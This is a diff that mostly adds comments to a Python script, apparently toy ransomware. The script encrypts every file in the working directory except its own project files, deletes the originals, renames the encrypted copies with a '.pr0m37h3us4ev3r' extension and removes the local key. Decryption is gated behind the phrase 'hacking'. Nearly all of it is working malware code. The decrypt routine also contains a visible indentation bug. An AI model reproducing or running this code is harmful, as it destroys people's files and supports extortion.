@@ -1,3 +1,4 @@
+# Importing modules
 import os
 import cryptography
 from cryptography.fernet import Fernet
@@ -10,17 +11,16 @@ import time
 
 
 # Setting up colours
-
 RED = Fore.RED
 BOLD = "\033[1m"
 RESET = Fore.RESET
 
 
 # Setting up Tkinter
-
 root = Tk()
 secretphrase = "hacking"
 
+# Declaring lists
 files = []
 file_name = []
 file_ext = []
@@ -28,59 +28,91 @@ file_order = []
 
 # let's find some files and encrypt them
 
+# The decrypt function
 def decrypt():
+    
+    # declaring lists
     files = []
     file_name = []
 
+    # Skipping these files
     for file in os.listdir():
         if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "upload.py" or file == 'main.py' or file == 'download.py' or file == 'test.py' or file == 'README.md' or file == 'test2.py' or file == 'test3.py' or file == ".git" or file == 'LICENSE.md':
             continue
 
+    # Checks if it is a file and then reads the filename
     if os.path.isfile(file):
         files.append(file)
         file_name = os.path.splitext(file)[0]
     
     try:
+        # Reads secret phrase for decryption
         user_phrase = input(BOLD + "\nEnter the secret phrase to decrypt your files: " + RESET)
+        
+        # If the phrase is correct
         if user_phrase == secretphrase:
             download_key()
+            
+            # Read the key
             with open("thekey.key", "rb") as key:
                 secretkey = key.read()
+            
+            # Reads the encrypted files list
             for file in file_order:
+                
+                # opens the files
                 with open(file, "rb") as thefile:
                     contents = thefile.read()
+                
+                # Decrypts the contents with Fernet
                 contents_decrypted = Fernet(secretkey).decrypt(contents)
                 file_name = os.path.splitext(file)[0]
+                
+                # Updates the extension to the original extension
                 for ext in file_ext:
                     original_filename = file_name + ext
                     file_ext.remove(ext)
                     break
+                
+                # Writes the decrypted contents to the file
                 with open(original_filename, "wb") as thefile:
                     thefile.write(contents_decrypted)
                     os.remove(file)
+            
+            # Deletes the key
             os.remove("thekey.key")
             time.sleep(5)
+            
+            # Success message
             print("\nCongratulations, your files have been decrypted!")
         else:
             time.sleep(5)
+            
+            # If the phrase is wrong
             print("\nSorry, the phrase you entered is wrong!")
 
+    # Invalid Token exception
     except (cryptography.fernet.InvalidToken, TypeError):
         print("\nThe files are not encrypted or there's been an unexpected error!")
 
+# The Encrypt function
 def encrypt(choice):
 
     choice = choice.lower()
     if choice == "yes":
+        
+        # Skip these files
         for file in os.listdir():
             if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "upload.py" or file == 'main.py' or file == 'download.py' or file == 'test.py' or file == 'test2.py' or file == 'test3.py' or file == 'README.md':
                 continue
-
+            
+            # Retrieve name and extension
             if os.path.isfile(file):
                 files.append(file)
                 file_name.append(os.path.splitext(file)[0])
                 file_ext.append(os.path.splitext(file)[1])
 
+        # Generate encryption key
         key = Fernet.generate_key()
 
         with open("thekey.key", "wb") as thekey:
@@ -92,21 +124,30 @@ def encrypt(choice):
         
         os.remove("thekey.key")
 
+        # Read the files
         for file in files:
             with open(file, "rb") as thefile:
                 contents = thefile.read()
+                
+            # Encrypt the file contents
             contents_encrypted = Fernet(key).encrypt(contents)
             #tempTuple = os.path.splitext(file)
+            
+            # Change the file extension
             for name in file_name:
                 extension = ".pr0m37h3us4ev3r"
                 encrypted_filename = name + extension
+                
+                # Write the encrypted contents to a new file
                 with open(encrypted_filename, "wb") as thefile:
                     thefile.write(contents_encrypted)
                 file_order.append(name + ".pr0m37h3us4ev3r")
                 file_name.remove(name)
                 break
+            # Remove the file
             os.remove(file)
         
+        # Destroy the warning window
         root.destroy()
         time.sleep(2)
         print("\nOops, all of your files have been encrypted!\n")
